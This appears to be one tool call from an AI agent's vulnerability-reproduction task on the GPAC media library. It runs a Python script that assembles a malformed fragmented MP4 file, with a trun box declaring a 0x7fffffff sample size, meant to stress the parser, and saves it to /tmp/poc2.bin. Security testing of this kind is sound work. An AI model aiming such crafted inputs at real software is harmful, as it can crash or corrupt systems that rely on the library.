Command `cd /workspace/repo-vul/src-vul/gpac && python3 - <<'PY'
from pathlib import Path
import struct

def box(t,p): return struct.pack('>I4s',8+len(p),t.encode())+p
ftyp=box('ftyp', b'isom\x00\x00\x02\x00isomiso2')
# moov with one trak and minimal stbl to satisfy sample count paths
mvhd=box('mvhd', b'\x00'*100)
# minimal trak hierarchy with empty stbl boxes often enough to parse and later fragment handling
stsd=box('stsd', b'\x00'*8)
stts=box('stts', b'\x00'*8)
stsc=box('stsc', b'\x00'*8)
stsz=box('stsz', b'\x00'*12)
stco=box('stco', b'\x00'*8)
stbl=box('stbl', stsd+stts+stsc+stsz+stco)
minf=box('minf', stbl)
mdia=box('mdia', minf)
trak=box('trak', mdia)
moov=box('moov', mvhd+trak)
# fragment with one sample and a large trun size to stress parser
mfhd=box('mfhd', struct.pack('>II',0,1))
tfhd=box('tfhd', struct.pack('>II',0x020000,1))
tfdt=box('tfdt', struct.pack('>IQ',1,0))
trun=box('trun', struct.pack('>III',0x000301,1,0x7fffffff))
traf=box('traf', tfhd+tfdt+trun)
moof=box('moof', mfhd+traf)
mdat=box('mdat', b'A'*16)
Path('/tmp/poc2.bin').write_bytes(ftyp+moov+moof+mdat)
print('wrote', len((ftyp+moov+moof+mdat)))
PY
